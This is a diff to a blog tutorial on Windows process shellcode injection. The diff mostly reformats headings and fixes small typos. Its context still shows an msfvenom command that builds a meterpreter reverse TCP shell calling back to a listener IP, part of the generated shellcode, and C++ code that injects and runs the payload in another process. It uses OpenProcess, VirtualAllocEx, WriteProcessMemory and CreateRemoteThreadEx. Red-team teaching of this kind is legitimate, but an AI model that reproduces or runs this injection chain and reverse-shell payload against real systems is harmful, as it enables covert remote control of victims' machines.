@@ -22,7 +22,7 @@ Generally, shellcode injection in a process refers to injecting portable executa
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-shellcode.png">
 
 
-**Creating a Shellcode**    
+### Creating a Shellcode    
 We can use msfvenom to generate a generic reverse shell shellcode using below command.
 ```bash
 msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe
@@ -40,7 +40,7 @@ unsigned char wannabe[] =
 "\xf0\xb5\xa2\x56\xff\xd5";
 ```
 
-**Enumerating the Running Process**
+### Enumerating the Running Process
 We have previously discussed the enumeration of processes and their entities such as process IDs and process names in previous blogs. You can refer to this link for more information on the **[ToolHelp32](https://nirajkharel.com.np/posts/process-enumeration-toolhelp32/)** function. Process enumeration can also be achieved using other methods like the **[Windows Terminal Services API](https://nirajkharel.com.np/posts/process-enumeration-windows-terminal-services/)**, **[EnumProcess](https://nirajkharel.com.np/posts/process-enumeration-enum-process/)**, or **[NtQuerySystemInformation](https://nirajkharel.com.np/posts/process-enumeration-ntqueryinformation/)**.
 
 Define the function for process Id enumeration and call it within the **main** function.
@@ -62,7 +62,7 @@ int main(){
 }
 ```
 
-Once we have enumerate the running processes and the process Ids associated with them, we need to open the handle to the proccess that we want to inject our code. Here I have described the impelementation of the [**Open Process**](https://nirajkharel.com.np/posts/process-module-enumeration/#openprocess) function.
+Once we have enumerated the running processes and the process Ids associated with them, we need to open the handle to the proccess that we want to inject our code. Here I have described the impelementation of the [**Open Process**](https://nirajkharel.com.np/posts/process-module-enumeration/#openprocess) function.
 ```c++
 void InjectShellcode(DWORD pid) {
 
@@ -83,7 +83,7 @@ void InjectShellcode(DWORD pid) {
     }
 ``` 
 
-**Buffer Allocation -** [**VirtualAllocEx**](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
+### Buffer Allocation - [**VirtualAllocEx**](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
 
 As we discussed earlier, we need to allocate our buffer into the virtual address space of the running process. Before that, we need to allocate/reserve the region of the memory within the virtual address space. This can be done using VirtualAllocEx function of the windows API
 
@@ -117,8 +117,7 @@ Once we are ready with the function and its parameters, let's define it inside o
     DWORD flProtect = PAGE_EXECUTE_READWRITE; // Necessary permission to write and execute the shellcode
 
 // Define the function VirtualAllocEx
-    LPVOID lpAlloc = VirtualAllocEx(hProcess, 
-    lpAddress, dwSize, flAllocationType, flProtect);
+    LPVOID lpAlloc = VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
   	if (lpAlloc == NULL){
   		printf("\nFailed to Allocate the memory\n");
   		CloseHandle(hProcess);
@@ -127,7 +126,7 @@ Once we are ready with the function and its parameters, let's define it inside o
     printf("Allocated the memory into virtual space");
 ```
 
-**Write Buffer into the Allocated Memory -** **[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)**
+### Write Buffer into the Allocated Memory - **[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)**
 Once we have allocated our memory into the virtual address space, the next process is to write the buffer (shellcode) into that memory space. In order for this function to execute successfully, the handle to the process must contain **PROCESS_VM_WRITE** and **PROCESS_VM_OPERATION** access. Therefore, it is necessary to define such access while creating a handle to the process using **OpenProcess**. The return type for this function when it succeeds is nonzero and returns 0 when it fails. It contains five parameters in which four are input parameters and one is output.
 
 **SYNTAX**
@@ -166,7 +165,7 @@ So generally, here we are accessing the handle of the process, navigating throug
   	printf("Successfully wrote memory to the process\n");
 ```
 
-**Execute the Shellcode -** **[CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)**
+### Execute the Shellcode - **[CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)**
 Once we have our shellcode written into the memory address, we can execute that shellcode using a new thread. A running process contains a number of threads running inside it which have their own objectives. A thread can execute any part of the code in the process; therefore, our shellcode could be executed as well. We just need to provide it a clear instruction about the location of our shellcode. It returns a handle to the new thread when it succeeds and the return value will be NULL if it fails.
 
 ```c++
@@ -181,6 +180,7 @@ HANDLE CreateRemoteThreadEx(
   [out, optional] LPDWORD                      lpThreadId
 );
 ```
+
 - **HANDLE hProcess**: Contains the handle to the process. In order for this to execute successfully, while defining **OpenProcess** functions it must be defined with access rights as `PROCESS_CREATE_THREAD`, `PROCESS_QUERY_INFORMATION`, `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, and `PROCESS_VM_READ`.
 - **LPSECURITY_ATTRIBUTES lpThreadAttributes**: Defines whether a child process can inherit the returned handle. We do not need that as we do not want our shellcode to be executed on the child process. We can set this as `NULL`.
 - **SIZE_T dwStackSize**: Defines the size of the [stack](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-stack-size) for the thread. We can set it as 0 to instruct the thread to use the default size of the executable.
@@ -239,7 +239,7 @@ DWORD WaitForSingleObject(
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-shellcode.gif">
 <br>
 
-**References**
+## References
 - [https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection](https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection)
 - [https://redfoxsec.com/blog/process-injection-harnessing-the-power-of-shellcode](https://redfoxsec.com/blog/process-injection-harnessing-the-power-of-shellcode)
 - [https://www.ired.team/offensive-security/code-injection-process-injection/process-injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
